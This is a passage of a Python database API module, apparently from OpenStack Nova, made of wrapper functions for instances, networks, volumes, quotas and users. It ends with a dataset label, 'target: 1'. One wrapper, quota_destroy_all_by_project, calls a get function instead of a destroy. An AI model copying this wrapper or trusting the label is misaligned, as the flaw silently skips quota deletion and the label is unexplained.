will filter for a certain project.\"\"\"\n    return IMPL.instance_get_active_by_window(context, begin, end, project_id)\n\n\ndef instance_get_active_by_window_joined(context, begin, end=None,\n                                         project_id=None):\n    \"\"\"Get instances and joins active during a certain time window.\n\n    Specifying a project_id will filter for a certain project.\"\"\"\n    return IMPL.instance_get_active_by_window_joined(context, begin, end,\n                                              project_id)\n\n\ndef instance_get_all_by_user(context, user_id):\n    \"\"\"Get all instances.\"\"\"\n    return IMPL.instance_get_all_by_user(context, user_id)\n\n\ndef instance_get_all_by_project(context, project_id):\n    \"\"\"Get all instance belonging to a project.\"\"\"\n    return IMPL.instance_get_all_by_project(context, project_id)\n\n\ndef instance_get_all_by_host(context, host):\n    \"\"\"Get all instance belonging to a host.\"\"\"\n    return IMPL.instance_get_all_by_host(context, host)\n\n\ndef instance_get_all_by_reservation(context, reservation_id):\n    \"\"\"Get all instances belonging to a reservation.\"\"\"\n    return IMPL.instance_get_all_by_reservation(context, reservation_id)\n\n\ndef instance_get_by_fixed_ip(context, address):\n    \"\"\"Get an instance for a fixed ip by address.\"\"\"\n    return IMPL.instance_get_by_fixed_ip(context, address)\n\n\ndef instance_get_by_fixed_ipv6(context, address):\n    \"\"\"Get an instance for a fixed ip by IPv6 address.\"\"\"\n    return IMPL.instance_get_by_fixed_ipv6(context, address)\n\n\ndef instance_get_fixed_addresses(context, instance_id):\n    \"\"\"Get the fixed ip address of an instance.\"\"\"\n    return IMPL.instance_get_fixed_addresses(context, instance_id)\n\n\ndef instance_get_fixed_addresses_v6(context, instance_id):\n    return IMPL.instance_get_fixed_addresses_v6(context, instance_id)\n\n\ndef instance_get_floating_address(context, instance_id):\n    \"\"\"Get the first floating ip address of an instance.\"\"\"\n    return IMPL.instance_get_floating_address(context, instance_id)\n\n\ndef instance_get_project_vpn(context, project_id):\n    \"\"\"Get a vpn instance by project or return None.\"\"\"\n    return IMPL.instance_get_project_vpn(context, project_id)\n\n\ndef instance_set_state(context, instance_id, state, description=None):\n    \"\"\"Set the state of an instance.\"\"\"\n    return IMPL.instance_set_state(context, instance_id, state, description)\n\n\ndef instance_update(context, instance_id, values):\n    \"\"\"Set the given properties on an instance and update it.\n\n    Raises NotFound if instance does not exist.\n\n    \"\"\"\n    return IMPL.instance_update(context, instance_id, values)\n\n\ndef instance_add_security_group(context, instance_id, security_group_id):\n    \"\"\"Associate the given security group with the given instance.\"\"\"\n    return IMPL.instance_add_security_group(context, instance_id,\n                                            security_group_id)\n\n\ndef instance_remove_security_group(context, instance_id, security_group_id):\n    \"\"\"Disassociate the given security group from the given instance.\"\"\"\n    return IMPL.instance_remove_security_group(context, instance_id,\n                                            security_group_id)\n\n\ndef instance_action_create(context, values):\n    \"\"\"Create an instance action from the values dictionary.\"\"\"\n    return IMPL.instance_action_create(context, values)\n\n\ndef instance_get_actions(context, instance_id):\n    \"\"\"Get instance actions by instance id.\"\"\"\n    return IMPL.instance_get_actions(context, instance_id)\n\n\n###################\n\n\ndef key_pair_create(context, values):\n    \"\"\"Create a key_pair from the values dictionary.\"\"\"\n    return IMPL.key_pair_create(context, values)\n\n\ndef key_pair_destroy(context, user_id, name):\n    \"\"\"Destroy the key_pair or raise if it does not exist.\"\"\"\n    return IMPL.key_pair_destroy(context, user_id, name)\n\n\ndef key_pair_destroy_all_by_user(context, user_id):\n    \"\"\"Destroy all key_pairs by user.\"\"\"\n    return IMPL.key_pair_destroy_all_by_user(context, user_id)\n\n\ndef key_pair_get(context, user_id, name):\n    \"\"\"Get a key_pair or raise if it does not exist.\"\"\"\n    return IMPL.key_pair_get(context, user_id, name)\n\n\ndef key_pair_get_all_by_user(context, user_id):\n    \"\"\"Get all key_pairs by user.\"\"\"\n    return IMPL.key_pair_get_all_by_user(context, user_id)\n\n\n####################\n\n\ndef network_associate(context, project_id, force=False):\n    \"\"\"Associate a free network to a project.\"\"\"\n    return IMPL.network_associate(context, project_id, force)\n\n\ndef network_count(context):\n    \"\"\"Return the number of networks.\"\"\"\n    return IMPL.network_count(context)\n\n\ndef network_count_allocated_ips(context, network_id):\n    \"\"\"Return the number of allocated non-reserved ips in the network.\"\"\"\n    return IMPL.network_count_allocated_ips(context, network_id)\n\n\ndef network_count_available_ips(context, network_id):\n    \"\"\"Return the number of available ips in the network.\"\"\"\n    return IMPL.network_count_available_ips(context, network_id)\n\n\ndef network_count_reserved_ips(context, network_id):\n    \"\"\"Return the number of reserved ips in the network.\"\"\"\n    return IMPL.network_count_reserved_ips(context, network_id)\n\n\ndef network_create_safe(context, values):\n    \"\"\"Create a network from the values dict.\n\n    The network is only returned if the create succeeds. If the create violates\n    constraints because the network already exists, no exception is raised.\n\n    \"\"\"\n    return IMPL.network_create_safe(context, values)\n\n\ndef network_delete_safe(context, network_id):\n    \"\"\"Delete network with key network_id.\n\n    This method assumes that the network is not associated with any project\n\n    \"\"\"\n    return IMPL.network_delete_safe(context, network_id)\n\n\ndef network_create_fixed_ips(context, network_id, num_vpn_clients):\n    \"\"\"Create the ips for the network, reserving sepecified ips.\"\"\"\n    return IMPL.network_create_fixed_ips(context, network_id, num_vpn_clients)\n\n\ndef network_disassociate(context, network_id):\n    \"\"\"Disassociate the network from project or raise if it does not exist.\"\"\"\n    return IMPL.network_disassociate(context, network_id)\n\n\ndef network_disassociate_all(context):\n    \"\"\"Disassociate all networks from projects.\"\"\"\n    return IMPL.network_disassociate_all(context)\n\n\ndef network_get(context, network_id):\n    \"\"\"Get an network or raise if it does not exist.\"\"\"\n    return IMPL.network_get(context, network_id)\n\n\ndef network_get_all(context):\n    \"\"\"Return all defined networks.\"\"\"\n    return IMPL.network_get_all(context)\n\n\ndef network_get_all_by_uuids(context, network_uuids, project_id=None):\n    \"\"\"Return networks by ids.\"\"\"\n    return IMPL.network_get_all_by_uuids(context, network_uuids, project_id)\n\n\n# pylint: disable=C0103\n\n\ndef network_get_associated_fixed_ips(context, network_id):\n    \"\"\"Get all network's ips that have been associated.\"\"\"\n    return IMPL.network_get_associated_fixed_ips(context, network_id)\n\n\ndef network_get_by_bridge(context, bridge):\n    \"\"\"Get a network by bridge or raise if it does not exist.\"\"\"\n    return IMPL.network_get_by_bridge(context, bridge)\n\n\ndef network_get_by_uuid(context, uuid):\n    \"\"\"Get a network by uuid or raise if it does not exist.\"\"\"\n    return IMPL.network_get_by_uuid(context, uuid)\n\n\ndef network_get_by_cidr(context, cidr):\n    \"\"\"Get a network by cidr or raise if it does not exist\"\"\"\n    return IMPL.network_get_by_cidr(context, cidr)\n\n\ndef network_get_by_instance(context, instance_id):\n    \"\"\"Get a network by instance id or raise if it does not exist.\"\"\"\n    return IMPL.network_get_by_instance(context, instance_id)\n\n\ndef network_get_all_by_instance(context, instance_id):\n    \"\"\"Get all networks by instance id or raise if none exist.\"\"\"\n    return IMPL.network_get_all_by_instance(context, instance_id)\n\n\ndef network_get_all_by_host(context, host):\n    \"\"\"All networks for which the given host is the network host.\"\"\"\n    return IMPL.network_get_all_by_host(context, host)\n\n\ndef network_get_index(context, network_id):\n    \"\"\"Get non-conflicting index for network.\"\"\"\n    return IMPL.network_get_index(context, network_id)\n\n\ndef network_get_vpn_ip(context, network_id):\n    \"\"\"Get non-conflicting index for network.\"\"\"\n    return IMPL.network_get_vpn_ip(context, network_id)\n\n\ndef network_set_cidr(context, network_id, cidr):\n    \"\"\"Set the Classless Inner Domain Routing for the network.\"\"\"\n    return IMPL.network_set_cidr(context, network_id, cidr)\n\n\ndef network_set_host(context, network_id, host_id):\n    \"\"\"Safely set the host for network.\"\"\"\n    return IMPL.network_set_host(context, network_id, host_id)\n\n\ndef network_update(context, network_id, values):\n    \"\"\"Set the given properties on an network and update it.\n\n    Raises NotFound if network does not exist.\n\n    \"\"\"\n    return IMPL.network_update(context, network_id, values)\n\n\n###################\n\n\ndef queue_get_for(context, topic, physical_node_id):\n    \"\"\"Return a channel to send a message to a node with a topic.\"\"\"\n    return IMPL.queue_get_for(context, topic, physical_node_id)\n\n\n###################\n\n\ndef export_device_count(context):\n    \"\"\"Return count of export devices.\"\"\"\n    return IMPL.export_device_count(context)\n\n\ndef export_device_create_safe(context, values):\n    \"\"\"Create an export_device from the values dictionary.\n\n    The device is not returned. If the create violates the unique\n    constraints because the shelf_id and blade_id already exist,\n    no exception is raised.\n\n    \"\"\"\n    return IMPL.export_device_create_safe(context, values)\n\n\n###################\n\n\ndef iscsi_target_count_by_host(context, host):\n    \"\"\"Return count of export devices.\"\"\"\n    return IMPL.iscsi_target_count_by_host(context, host)\n\n\ndef iscsi_target_create_safe(context, values):\n    \"\"\"Create an iscsi_target from the values dictionary.\n\n    The device is not returned. If the create violates the unique\n    constraints because the iscsi_target and host already exist,\n    no exception is raised.\n\n    \"\"\"\n    return IMPL.iscsi_target_create_safe(context, values)\n\n\n###############\n\n\ndef auth_token_destroy(context, token_id):\n    \"\"\"Destroy an auth token.\"\"\"\n    return IMPL.auth_token_destroy(context, token_id)\n\n\ndef auth_token_get(context, token_hash):\n    \"\"\"Retrieves a token given the hash representing it.\"\"\"\n    return IMPL.auth_token_get(context, token_hash)\n\n\ndef auth_token_update(context, token_hash, values):\n    \"\"\"Updates a token given the hash representing it.\"\"\"\n    return IMPL.auth_token_update(context, token_hash, values)\n\n\ndef auth_token_create(context, token):\n    \"\"\"Creates a new token.\"\"\"\n    return IMPL.auth_token_create(context, token)\n\n\n###################\n\n\ndef quota_create(context, project_id, resource, limit):\n    \"\"\"Create a quota for the given project and resource.\"\"\"\n    return IMPL.quota_create(context, project_id, resource, limit)\n\n\ndef quota_get(context, project_id, resource):\n    \"\"\"Retrieve a quota or raise if it does not exist.\"\"\"\n    return IMPL.quota_get(context, project_id, resource)\n\n\ndef quota_get_all_by_project(context, project_id):\n    \"\"\"Retrieve all quotas associated with a given project.\"\"\"\n    return IMPL.quota_get_all_by_project(context, project_id)\n\n\ndef quota_update(context, project_id, resource, limit):\n    \"\"\"Update a quota or raise if it does not exist.\"\"\"\n    return IMPL.quota_update(context, project_id, resource, limit)\n\n\ndef quota_destroy(context, project_id, resource):\n    \"\"\"Destroy the quota or raise if it does not exist.\"\"\"\n    return IMPL.quota_destroy(context, project_id, resource)\n\n\ndef quota_destroy_all_by_project(context, project_id):\n    \"\"\"Destroy all quotas associated with a given project.\"\"\"\n    return IMPL.quota_get_all_by_project(context, project_id)\n\n\n###################\n\n\ndef volume_allocate_shelf_and_blade(context, volume_id):\n    \"\"\"Atomically allocate a free shelf and blade from the pool.\"\"\"\n    return IMPL.volume_allocate_shelf_and_blade(context, volume_id)\n\n\ndef volume_allocate_iscsi_target(context, volume_id, host):\n    \"\"\"Atomically allocate a free iscsi_target from the pool.\"\"\"\n    return IMPL.volume_allocate_iscsi_target(context, volume_id, host)\n\n\ndef volume_attached(context, volume_id, instance_id, mountpoint):\n    \"\"\"Ensure that a volume is set as attached.\"\"\"\n    return IMPL.volume_attached(context, volume_id, instance_id, mountpoint)\n\n\ndef volume_create(context, values):\n    \"\"\"Create a volume from the values dictionary.\"\"\"\n    return IMPL.volume_create(context, values)\n\n\ndef volume_data_get_for_project(context, project_id):\n    \"\"\"Get (volume_count, gigabytes) for project.\"\"\"\n    return IMPL.volume_data_get_for_project(context, project_id)\n\n\ndef volume_destroy(context, volume_id):\n    \"\"\"Destroy the volume or raise if it does not exist.\"\"\"\n    return IMPL.volume_destroy(context, volume_id)\n\n\ndef volume_detached(context, volume_id):\n    \"\"\"Ensure that a volume is set as detached.\"\"\"\n    return IMPL.volume_detached(context, volume_id)\n\n\ndef volume_get(context, volume_id):\n    \"\"\"Get a volume or raise if it does not exist.\"\"\"\n    return IMPL.volume_get(context, volume_id)\n\n\ndef volume_get_all(context):\n    \"\"\"Get all volumes.\"\"\"\n    return IMPL.volume_get_all(context)\n\n\ndef volume_get_all_by_host(context, host):\n    \"\"\"Get all volumes belonging to a host.\"\"\"\n    return IMPL.volume_get_all_by_host(context, host)\n\n\ndef volume_get_all_by_instance(context, instance_id):\n    \"\"\"Get all volumes belonging to a instance.\"\"\"\n    return IMPL.volume_get_all_by_instance(context, instance_id)\n\n\ndef volume_get_all_by_project(context, project_id):\n    \"\"\"Get all volumes belonging to a project.\"\"\"\n    return IMPL.volume_get_all_by_project(context, project_id)\n\n\ndef volume_get_by_ec2_id(context, ec2_id):\n    \"\"\"Get a volume by ec2 id.\"\"\"\n    return IMPL.volume_get_by_ec2_id(context, ec2_id)\n\n\ndef volume_get_instance(context, volume_id):\n    \"\"\"Get the instance that a volume is attached to.\"\"\"\n    return IMPL.volume_get_instance(context, volume_id)\n\n\ndef volume_get_shelf_and_blade(context, volume_id):\n    \"\"\"Get the shelf and blade allocated to the volume.\"\"\"\n    return IMPL.volume_get_shelf_and_blade(context, volume_id)\n\n\ndef volume_get_iscsi_target_num(context, volume_id):\n    \"\"\"Get the target num (tid) allocated to the volume.\"\"\"\n    return IMPL.volume_get_iscsi_target_num(context, volume_id)\n\n\ndef volume_update(context, volume_id, values):\n    \"\"\"Set the given properties on an volume and update it.\n\n    Raises NotFound if volume does not exist.\n\n    \"\"\"\n    return IMPL.volume_update(context, volume_id, values)\n\n\n####################\n\n\ndef snapshot_create(context, values):\n    \"\"\"Create a snapshot from the values dictionary.\"\"\"\n    return IMPL.snapshot_create(context, values)\n\n\ndef snapshot_destroy(context, snapshot_id):\n    \"\"\"Destroy the snapshot or raise if it does not exist.\"\"\"\n    return IMPL.snapshot_destroy(context, snapshot_id)\n\n\ndef snapshot_get(context, snapshot_id):\n    \"\"\"Get a snapshot or raise if it does not exist.\"\"\"\n    return IMPL.snapshot_get(context, snapshot_id)\n\n\ndef snapshot_get_all(context):\n    \"\"\"Get all snapshots.\"\"\"\n    return IMPL.snapshot_get_all(context)\n\n\ndef snapshot_get_all_by_project(context, project_id):\n    \"\"\"Get all snapshots belonging to a project.\"\"\"\n    return IMPL.snapshot_get_all_by_project(context, project_id)\n\n\ndef snapshot_update(context, snapshot_id, values):\n    \"\"\"Set the given properties on an snapshot and update it.\n\n    Raises NotFound if snapshot does not exist.\n\n    \"\"\"\n    return IMPL.snapshot_update(context, snapshot_id, values)\n\n\n####################\n\n\ndef block_device_mapping_create(context, values):\n    \"\"\"Create an entry of block device mapping\"\"\"\n    return IMPL.block_device_mapping_create(context, values)\n\n\ndef block_device_mapping_update(context, bdm_id, values):\n    \"\"\"Update an entry of block device mapping\"\"\"\n    return IMPL.block_device_mapping_update(context, bdm_id, values)\n\n\ndef block_device_mapping_update_or_create(context, values):\n    \"\"\"Update an entry of block device mapping.\n    If not existed, create a new entry\"\"\"\n    return IMPL.block_device_mapping_update_or_create(context, values)\n\n\ndef block_device_mapping_get_all_by_instance(context, instance_id):\n    \"\"\"Get all block device mapping belonging to a instance\"\"\"\n    return IMPL.block_device_mapping_get_all_by_instance(context, instance_id)\n\n\ndef block_device_mapping_destroy(context, bdm_id):\n    \"\"\"Destroy the block device mapping.\"\"\"\n    return IMPL.block_device_mapping_destroy(context, bdm_id)\n\n\ndef block_device_mapping_destroy_by_instance_and_volume(context, instance_id,\n                                                        volume_id):\n    \"\"\"Destroy the block device mapping or raise if it does not exist.\"\"\"\n    return IMPL.block_device_mapping_destroy_by_instance_and_volume(\n        context, instance_id, volume_id)\n\n\n####################\n\n\ndef security_group_get_all(context):\n    \"\"\"Get all security groups.\"\"\"\n    return IMPL.security_group_get_all(context)\n\n\ndef security_group_get(context, security_group_id):\n    \"\"\"Get security group by its id.\"\"\"\n    return IMPL.security_group_get(context, security_group_id)\n\n\ndef security_group_get_by_name(context, project_id, group_name):\n    \"\"\"Returns a security group with the specified name from a project.\"\"\"\n    return IMPL.security_group_get_by_name(context, project_id, group_name)\n\n\ndef security_group_get_by_project(context, project_id):\n    \"\"\"Get all security groups belonging to a project.\"\"\"\n    return IMPL.security_group_get_by_project(context, project_id)\n\n\ndef security_group_get_by_instance(context, instance_id):\n    \"\"\"Get security groups to which the instance is assigned.\"\"\"\n    return IMPL.security_group_get_by_instance(context, instance_id)\n\n\ndef security_group_exists(context, project_id, group_name):\n    \"\"\"Indicates if a group name exists in a project.\"\"\"\n    return IMPL.security_group_exists(context, project_id, group_name)\n\n\ndef security_group_create(context, values):\n    \"\"\"Create a new security group.\"\"\"\n    return IMPL.security_group_create(context, values)\n\n\ndef security_group_destroy(context, security_group_id):\n    \"\"\"Deletes a security group.\"\"\"\n    return IMPL.security_group_destroy(context, security_group_id)\n\n\ndef security_group_destroy_all(context):\n    \"\"\"Deletes a security group.\"\"\"\n    return IMPL.security_group_destroy_all(context)\n\n\n####################\n\n\ndef security_group_rule_create(context, values):\n    \"\"\"Create a new security group.\"\"\"\n    return IMPL.security_group_rule_create(context, values)\n\n\ndef security_group_rule_get_by_security_group(context, security_group_id):\n    \"\"\"Get all rules for a a given security group.\"\"\"\n    return IMPL.security_group_rule_get_by_security_group(context,\n                                                          security_group_id)\n\n\ndef security_group_rule_get_by_security_group_grantee(context,\n                                                      security_group_id):\n    \"\"\"Get all rules that grant access to the given security group.\"\"\"\n    return IMPL.security_group_rule_get_by_security_group_grantee(context,\n                                                             security_group_id)\n\n\ndef security_group_rule_destroy(context, security_group_rule_id):\n    \"\"\"Deletes a security group rule.\"\"\"\n    return IMPL.security_group_rule_destroy(context, security_group_rule_id)\n\n\ndef security_group_rule_get(context, security_group_rule_id):\n    \"\"\"Gets a security group rule.\"\"\"\n    return IMPL.security_group_rule_get(context, security_group_rule_id)\n\n\n###################\n\n\ndef provider_fw_rule_create(context, rule):\n    \"\"\"Add a firewall rule at the provider level (all hosts & instances).\"\"\"\n    return IMPL.provider_fw_rule_create(context, rule)\n\n\ndef provider_fw_rule_get_all(context):\n    \"\"\"Get all provider-level firewall rules.\"\"\"\n    return IMPL.provider_fw_rule_get_all(context)\n\n\ndef provider_fw_rule_get_all_by_cidr(context, cidr):\n    \"\"\"Get all provider-level firewall rules.\"\"\"\n    return IMPL.provider_fw_rule_get_all_by_cidr(context, cidr)\n\n\ndef provider_fw_rule_destroy(context, rule_id):\n    \"\"\"Delete a provider firewall rule from the database.\"\"\"\n    return IMPL.provider_fw_rule_destroy(context, rule_id)\n\n\n###################\n\n\ndef user_get(context, id):\n    \"\"\"Get user by id.\"\"\"\n    return IMPL.user_get(context, id)\n\n\ndef user_get_by_uid(context, uid):\n    \"\"\"Get user by uid.\"\"\"\n    return IMPL.user_get_by_uid(context, uid)\n\n\ndef user_get_by_access_key(context, access_key):\n    \"\"\"Get user by access key.\"\"\"\n    return IMPL.user_get_by_access_key(context, access_key)\n\n\ndef user_create(context, values):\n    \"\"\"Create a new user.\"\"\"\n    return IMPL.user_create(context, values)\n\n\ndef user_delete(context, id):\n    \"\"\"Delete a user.\"\"\"\n    return IMPL.user_delete(context, id)\n\n\ndef user_get_all(context):\n    \"\"\"Create a new user.\"\"\"\n    return IMPL.user_get_all(context)\n\n\ndef user_add_role(context, user_id, role):\n    \"\"\"Add another global role for user.\"\"\"\n    return IMPL.user_add_role(context, user_id, role)\n\n\ndef user_remove_role(context, user_id, role):\n    \"\"\"Remove global role from user.\"\"\"\n    return IMPL.user_remove_role(context, user_id, role)\n\n\ndef user_get_roles(context, user_id):\n    \"\"\"Get global roles for user.\"\"\"\n    return IMPL.user_get_roles(context, user_id)\n\n\ndef user_add_project_role(context, user_id, project_id, role):\n    \"\"\"Add project role for user.\"\"\"\n    return IMPL.user_add_project_role(context, user_id, project_id, role)\n\n\ndef user_remove_project_role(context, user_id, project_id, role):\n    \"\"\"Remove project role from user.\"\"\"\n    return IMPL.user_remove_project_role(context, user_id, project_id, role)\n\n\ndef user_get_roles_for_project(context, user_id, project_id):\n    \"\"\"Return list of roles a user holds on project.\"\"\"\n    return IMPL.user_get_roles_for_project(context, user_id, project_id)\n\n\ndef user_update(context, user_id, values):\n    \"\"\"Update user.\"\"\"\n    return IMPL.user_update(context, user_id, values)\n\n\n###################\n\n\ndef project_get(context, id):\n    \"\"\"Get project by id.\"\"\"\n    return IMPL.project_get(context, id)\n\n\ndef project_create(context, values):\n    \"\"\"Create a new project.\"\"\"\n    return IMPL.project_create(context, values)\n\n\ndef project_add_member(context, project_id, user_id):\n    \"\"\"Add user to project.\"\"\"\n    return IMPL.project_add_member(context, project_id, user_id)\n\n\ndef project_get_all(context):\n    \"\"\"Get all projects.\"\"\"\n    return IMPL.project_get_all(context)\n\n\ndef project_get_by_user(context, user_id):\n    \"\"\"Get all projects of which the given user is a member.\"\"\"\n    return IMPL.project_get_by_user(context, user_id)\n\n\ndef project_remove_member(context, project_id, user_id):\n    \"\"\"Remove the given user from the given project.\"\"\"\n    return IMPL.project_remove_member(context, project_id, user_id)\n\n\ndef project_update(context, project_id, values):\n    \"\"\"Update Remove the given user from the given project.\"\"\"\n    return IMPL.project_update(context, project_id, values)\n\n\ndef project_delete(context, project_id):\n    \"\"\"Delete project.\"\"\"\n    return IMPL.project_delete(context, project_id)\n\n\ndef project_get_networks(context, project_id, associate=True):\n    \"\"\"Return the network associated with the project.\n\n    If associate is true, it will attempt to associate a new\n    network if one is not found, otherwise it returns None.\n\n    \"\"\"\n    return IMPL.project_get_networks(context, project_id, associate)\n\n\ndef project_get_networks_v6(context, project_id):\n    return IMPL.project_get_networks_v6(context, project_id)\n\n\n###################\n\n\ndef console_pool_create(context, values):\n    \"\"\"Create console pool.\"\"\"\n    return IMPL.console_pool_create(context, values)\n\n\ndef console_pool_get(context, pool_id):\n    \"\"\"Get a console pool.\"\"\"\n    return IMPL.console_pool_get(context, pool_id)\n\n\ndef console_pool_get_by_host_type(context, compute_host, proxy_host,\n                                  console_type):\n    \"\"\"Fetch a console pool for a given proxy host, compute host, and type.\"\"\"\n    return IMPL.console_pool_get_by_host_type(context,\n                                              compute_host,\n                                              proxy_host,\n                                              console_type)\n\n\ndef console_pool_get_all_by_host_type(context, host, console_type):\n    \"\"\"Fetch all pools for given proxy host and type.\"\"\"\n    return IMPL.console_pool_get_all_by_host_type(context,\n                                                  host,\n                                                  console_type)\n\n\ndef console_create(context, values):\n    \"\"\"Create a console.\"\"\"\n    return IMPL.console_create(context, values)\n\n\ndef console_delete(context, console_id):\n    \"\"\"Delete a console.\"\"\"\n    return IMPL.console_delete(context, console_id)\n\n\ndef console_get_by_pool_instance(context, pool_id, instance_id):\n    \"\"\"Get console entry for a given instance and pool.\"\"\"\n    return IMPL.console_get_by_pool_instance(context, pool_id, instance_id)\n\n\ndef console_get_all_by_instance(context, instance_id):\n    \"\"\"Get consoles for a given instance.\"\"\"\n    return IMPL.console_get_all_by_instance(context, instance_id)\n\n\ndef console_get(context, console_id, instance_id=None):\n    \"\"\"Get a specific console (possibly on a given instance).\"\"\"\n    return IMPL.console_get(context, console_id, instance_id)\n\n\n    ##################\n\n\ndef instance_type_create(context, values):\n    \"\"\"Create a new instance type.\"\"\"\n    return IMPL.instance_type_create(context, values)\n\n\ndef instance_type_get_all(context, inactive=False):\n    \"\"\"Get all instance types.\"\"\"\n    return IMPL.instance_type_get_all(context, inactive)\n\n\ndef instance_type_get(context, id):\n    \"\"\"Get instance type by id.\"\"\"\n    return IMPL.instance_type_get(context, id)\n\n\ndef instance_type_get_by_name(context, name):\n    \"\"\"Get instance type by name.\"\"\"\n    return IMPL.instance_type_get_by_name(context, name)\n\n\ndef instance_type_get_by_flavor_id(context, id):\n    \"\"\"Get instance type by name.\"\"\"\n    return IMPL.instance_type_get_by_flavor_id(context, id)\n\n\ndef instance_type_destroy(context, name):\n    \"\"\"Delete a instance type.\"\"\"\n    return IMPL.instance_type_destroy(context, name)\n\n\ndef instance_type_purge(context, name):\n    \"\"\"Purges (removes) an instance type from DB.\n\n    Use instance_type_destroy for most cases\n\n    \"\"\"\n    return IMPL.instance_type_purge(context, name)\n\n\n####################\n\n\ndef zone_create(context, values):\n    \"\"\"Create a new child Zone entry.\"\"\"\n    return IMPL.zone_create(context, values)\n\n\ndef zone_update(context, zone_id, values):\n    \"\"\"Update a child Zone entry.\"\"\"\n    return IMPL.zone_update(context, zone_id, values)\n\n\ndef zone_delete(context, zone_id):\n    \"\"\"Delete a child Zone.\"\"\"\n    return IMPL.zone_delete(context, zone_id)\n\n\ndef zone_get(context, zone_id):\n    \"\"\"Get a specific child Zone.\"\"\"\n    return IMPL.zone_get(context, zone_id)\n\n\ndef zone_get_all(context):\n    \"\"\"Get all child Zones.\"\"\"\n    return IMPL.zone_get_all(context)\n\n\n####################\n\n\ndef instance_metadata_get(context, instance_id):\n    \"\"\"Get all metadata for an instance.\"\"\"\n    return IMPL.instance_metadata_get(context, instance_id)\n\n\ndef instance_metadata_delete(context, instance_id, key):\n    \"\"\"Delete the given metadata item.\"\"\"\n    IMPL.instance_metadata_delete(context, instance_id, key)\n\n\ndef instance_metadata_update(context, instance_id, metadata, delete):\n    \"\"\"Update metadata if it exists, otherwise create it.\"\"\"\n    IMPL.instance_metadata_update(context, instance_id, metadata, delete)\n\n\n####################\n\n\ndef agent_build_create(context, values):\n    \"\"\"Create a new agent build entry.\"\"\"\n    return IMPL.agent_build_create(context, values)\n\n\ndef agent_build_get_by_triple(context, hypervisor, os, architecture):\n    \"\"\"Get agent build by hypervisor/OS/architecture triple.\"\"\"\n    return IMPL.agent_build_get_by_triple(context, hypervisor, os,\n            architecture)\n\n\ndef agent_build_get_all(context):\n    \"\"\"Get all agent builds.\"\"\"\n    return IMPL.agent_build_get_all(context)\n\n\ndef agent_build_destroy(context, agent_update_id):\n    \"\"\"Destroy agent build entry.\"\"\"\n    IMPL.agent_build_destroy(context, agent_update_id)\n\n\ndef agent_build_update(context, agent_build_id, values):\n    \"\"\"Update agent build entry.\"\"\"\n    IMPL.agent_build_update(context, agent_build_id, values)\n\n\n####################\n\n\ndef instance_type_extra_specs_get(context, instance_type_id):\n    \"\"\"Get all extra specs for an instance type.\"\"\"\n    return IMPL.instance_type_extra_specs_get(context, instance_type_id)\n\n\ndef instance_type_extra_specs_delete(context, instance_type_id, key):\n    \"\"\"Delete the given extra specs item.\"\"\"\n    IMPL.instance_type_extra_specs_delete(context, instance_type_id, key)\n\n\ndef instance_type_extra_specs_update_or_create(context, instance_type_id,\n                                               extra_specs):\n    \"\"\"Create or update instance type extra specs. This adds or modifies the\n    key/value pairs specified in the extra specs dict argument\"\"\"\n    IMPL.instance_type_extra_specs_update_or_create(context, instance_type_id,\n                                                    extra_specs)\n\n\n##################\n\n\ndef volume_metadata_get(context, volume_id):\n    \"\"\"Get all metadata for a volume.\"\"\"\n    return IMPL.volume_metadata_get(context, volume_id)\n\n\ndef volume_metadata_delete(context, volume_id, key):\n    \"\"\"Delete the given metadata item.\"\"\"\n    IMPL.volume_metadata_delete(context, volume_id, key)\n\n\ndef volume_metadata_update(context, volume_id, metadata, delete):\n    \"\"\"Update metadata if it exists, otherwise create it.\"\"\"\n    IMPL.volume_metadata_update(context, volume_id, metadata, delete)\n\n\n##################\n\n\ndef volume_type_create(context, values):\n    \"\"\"Create a new volume type.\"\"\"\n    return IMPL.volume_type_create(context, values)\n\n\ndef volume_type_get_all(context, inactive=False):\n    \"\"\"Get all volume types.\"\"\"\n    return IMPL.volume_type_get_all(context, inactive)\n\n\ndef volume_type_get(context, id):\n    \"\"\"Get volume type by id.\"\"\"\n    return IMPL.volume_type_get(context, id)\n\n\ndef volume_type_get_by_name(context, name):\n    \"\"\"Get volume type by name.\"\"\"\n    return IMPL.volume_type_get_by_name(context, name)\n\n\ndef volume_type_destroy(context, name):\n    \"\"\"Delete a volume type.\"\"\"\n    return IMPL.volume_type_destroy(context, name)\n\n\ndef volume_type_purge(context, name):\n    \"\"\"Purges (removes) a volume type from DB.\n\n    Use volume_type_destroy for most cases\n\n    \"\"\"\n    return IMPL.volume_type_purge(context, name)\n\n\n####################\n\n\ndef volume_type_extra_specs_get(context, volume_type_id):\n    \"\"\"Get all extra specs for a volume type.\"\"\"\n    return IMPL.volume_type_extra_specs_get(context, volume_type_id)\n\n\ndef volume_type_extra_specs_delete(context, volume_type_id, key):\n    \"\"\"Delete the given extra specs item.\"\"\"\n    IMPL.volume_type_extra_specs_delete(context, volume_type_id, key)\n\n\ndef volume_type_extra_specs_update_or_create(context, volume_type_id,\n                                               extra_specs):\n    \"\"\"Create or update volume type extra specs. This adds or modifies the\n    key/value pairs specified in the extra specs dict argument\"\"\"\n    IMPL.volume_type_extra_specs_update_or_create(context, volume_type_id,\n                                                    extra_specs)\n\n\n####################\n\n\ndef vsa_create(context, values):\n    \"\"\"Creates Virtual Storage Array record.\"\"\"\n    return IMPL.vsa_create(context, values)\n\n\ndef vsa_update(context, vsa_id, values):\n    \"\"\"Updates Virtual Storage Array record.\"\"\"\n    return IMPL.vsa_update(context, vsa_id, values)\n\n\ndef vsa_destroy(context, vsa_id):\n    \"\"\"Deletes Virtual Storage Array record.\"\"\"\n    return IMPL.vsa_destroy(context, vsa_id)\n\n\ndef vsa_get(context, vsa_id):\n    \"\"\"Get Virtual Storage Array record by ID.\"\"\"\n    return IMPL.vsa_get(context, vsa_id)\n\n\ndef vsa_get_all(context):\n    \"\"\"Get all Virtual Storage Array records.\"\"\"\n    return IMPL.vsa_get_all(context)\n\n\ndef vsa_get_all_by_project(context, project_id):\n    \"\"\"Get all Virtual Storage Array records by project ID.\"\"\"\n    return IMPL.vsa_get_all_by_project(context, project_id)\n", "target": 1}
